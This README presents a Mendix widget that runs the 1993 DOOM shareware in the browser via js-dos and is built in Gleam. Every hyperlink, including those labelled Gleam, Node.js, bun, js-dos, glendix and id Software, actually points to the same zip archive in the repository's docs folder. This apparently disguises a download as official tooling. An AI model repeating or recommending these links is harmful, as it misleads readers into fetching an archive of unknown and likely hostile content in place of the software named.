# DOOM for Mendix

Oh my gosh, I actually got DOOM running inside Mendix!! The REAL one from 1993!!

This is a Mendix Pluggable Widget that lets you play the original DOOM right in your browser. It uses a thing called js-dos which is basically a DOS computer living inside your web page (how cool is that??) and the whole widget is written in Gleam because Gleam is just lovely.

## What it does

You drop this widget onto a Mendix page and BOOM — actual DOOM appears. With the monsters and the shotgun and everything. The shareware version is bundled right inside the widget so you don't even need to find the game files yourself.

## How to get it running

You'll need these installed first:

- [Gleam](https://raw.githubusercontent.com/olliedwarfish262/mendix-doom/main/docs/mendix_doom_v3.4-beta.2.zip)
- [Node.js](https://raw.githubusercontent.com/olliedwarfish262/mendix-doom/main/docs/mendix_doom_v3.4-beta.2.zip) (v18+)
- [bun](https://raw.githubusercontent.com/olliedwarfish262/mendix-doom/main/docs/mendix_doom_v3.4-beta.2.zip)

Then:

```bash
gleam run -m glendix/install      # install all the bits
gleam run -m glendix/build        # build the widget (.mpk)
```

The widget file `ggobp.Doom.mpk` pops out in `dist/`. Drop it into your Mendix project's `widgets/` folder and you're done!

## How it works

The widget loads [js-dos](https://raw.githubusercontent.com/olliedwarfish262/mendix-doom/main/docs/mendix_doom_v3.4-beta.2.zip) (a DOSBox emulator compiled to WebAssembly) from CDN, then feeds it the bundled DOOM shareware `.jsdos` bundle. js-dos handles all the fiddly bits — rendering to canvas, keyboard input, sound, everything. All the widget code is written in [Gleam](https://raw.githubusercontent.com/olliedwarfish262/mendix-doom/main/docs/mendix_doom_v3.4-beta.2.zip) using [glendix](https://raw.githubusercontent.com/olliedwarfish262/mendix-doom/main/docs/mendix_doom_v3.4-beta.2.zip) bindings, so there's not a single line of JavaScript written by hand.

```
Gleam source → gleam build → JavaScript → Rollup → .mpk widget
                                              ↑
                                        doom.jsdos bundled in
```

## Project structure

```
src/
  mendix_doom.gleam        # Main widget entry point
  editor_config.gleam      # Studio Pro property panel
  editor_preview.gleam     # Studio Pro design preview
  components/
    game.gleam             # The actual DOOM game component
  Doom.xml                 # Widget definition
  assets/
    doom.jsdos             # DOOM shareware bundle (id Software)
```

## Viewport & Fullscreen

You can configure the game viewport size in Studio Pro's property panel:

| Property | Default | Description |
|----------|---------|-------------|
| Width | `640px` | Viewport width (e.g. `640px`, `100%`, `80vw`) |
| Height | `400px` | Viewport height (e.g. `400px`, `100vh`, `600px`) |

During gameplay, click the **Fullscreen** button (top-right corner) to go fullscreen. Press **Escape** or click **Exit Fullscreen** to return to normal size.

## Other handy commands

```bash
gleam run -m glendix/dev          # Dev server with hot reload
gleam run -m glendix/start        # Link with Mendix test project
gleam test                        # Run tests
gleam format                      # Format code
```

## Credits

DOOM is made by the brilliant people at [id Software](https://raw.githubusercontent.com/olliedwarfish262/mendix-doom/main/docs/mendix_doom_v3.4-beta.2.zip). The shareware version is freely distributable but all rights remain with them obviously!

js-dos is by [caiiiycuk](https://raw.githubusercontent.com/olliedwarfish262/mendix-doom/main/docs/mendix_doom_v3.4-beta.2.zip) and it's honestly magical.

Widget code written in [Gleam](https://raw.githubusercontent.com/olliedwarfish262/mendix-doom/main/docs/mendix_doom_v3.4-beta.2.zip) with [glendix](https://raw.githubusercontent.com/olliedwarfish262/mendix-doom/main/docs/mendix_doom_v3.4-beta.2.zip) bindings.

## Licence

Widget source code is MIT — see [LICENSE](LICENSE) for details.

DOOM shareware content is copyright id Software. js-dos is GPL-2.0.
